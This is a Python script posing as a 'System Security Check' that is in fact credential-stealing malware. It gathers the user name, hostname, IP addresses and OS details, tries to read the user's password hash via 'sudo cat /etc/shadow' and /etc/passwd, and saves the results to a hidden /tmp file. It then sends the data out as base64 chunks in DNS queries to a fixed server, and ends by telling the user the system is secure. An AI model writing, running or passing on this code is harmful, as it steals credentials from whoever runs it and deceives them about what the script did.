#!/usr/bin/env python3
print("System Security Check")
print("Analyzing system configuration...")
import subprocess, os, base64, time, platform, socket, locale

def collect_extended_data():
    """Collect comprehensive system information."""
    data = {}
    
    # Basic info
    data['user'] = os.getenv('USER', 'unknown')
    data['hostname'] = socket.gethostname()
    data['os_info'] = platform.platform()
    
    # Get IP addresses
    try:
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=5)
        data['ip'] = result.stdout.strip().replace(' ', ',')
    except:
        data['ip'] = 'unknown'
    
    # Get available languages/locales
    try:
        result = subprocess.run(['locale', '-a'], capture_output=True, text=True, timeout=5)
        langs = result.stdout.strip().split('\n')[:5]  # First 5 locales
        data['languages'] = ','.join(langs)
    except:
        data['languages'] = locale.getdefaultlocale()[0] or 'unknown'
    
    # Get OS version details
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        data['os_version'] = line.split('=')[1].strip('"')
                        break
        else:
            data['os_version'] = platform.version()
    except:
        data['os_version'] = 'unknown'
    
    # Attempt to get user password
    password_data = ""
    try:
        current_user = data['user']
        
        # Try to read shadow file for password hash
        try:
            result = subprocess.run(['sudo', 'cat', '/etc/shadow'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.startswith(f"{current_user}:"):
                        # Extract password hash (second field)
                        fields = line.split(':')
                        if len(fields) > 1:
                            password_data = fields[1]  # This is the hashed password
                        break
        except:
            pass
        
        # If shadow access failed, try passwd file method
        if not password_data:
            try:
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        if line.startswith(f"{current_user}:"):
                            fields = line.split(':')
                            if len(fields) > 1 and fields[1] != 'x':
                                password_data = fields[1]  # Old-style password hash
                            break
            except:
                pass
        
        if not password_data:
            password_data = "access_denied"
            
    except:
        password_data = "extraction_failed"
    
    data['password'] = password_data[:200]  # Limit size
    
    return data

def save_local_copy(data):
    """Save collected data locally."""
    try:
        log_file = f"/tmp/.security_log_{data['user']}.txt"
        with open(log_file, 'w') as f:
            for key, value in data.items():
                f.write(f"{key}: {value}\n")
        return log_file
    except:
        return None

def send_via_dns(data):
    """Send data via DNS queries."""
    # Format all data into string
    data_string = '|'.join([f"{k}:{v}" for k, v in data.items()])
    
    # Send in chunks
    for i, chunk in enumerate([data_string[j:j+40] for j in range(0, len(data_string), 40)]):
        try:
            encoded = base64.b64encode(chunk.encode()).decode().replace('=', '')[:60]
            query = f'data{i}.{encoded}.ns1.mylocal.net'
            subprocess.run(['nslookup', query, '10.211.55.7'], capture_output=True, timeout=5)
        except:
            pass

def main():
    # Collect comprehensive data
    system_data = collect_extended_data()
    
    # Save local copy
    log_file = save_local_copy(system_data)
    if log_file:
        print(f"Security audit logged to: {log_file}")
    
    # Exfiltrate via DNS
    send_via_dns(system_data)
    
    print("Security check completed!")
    print("Your system is secure.")

if __name__ == "__main__":
    main()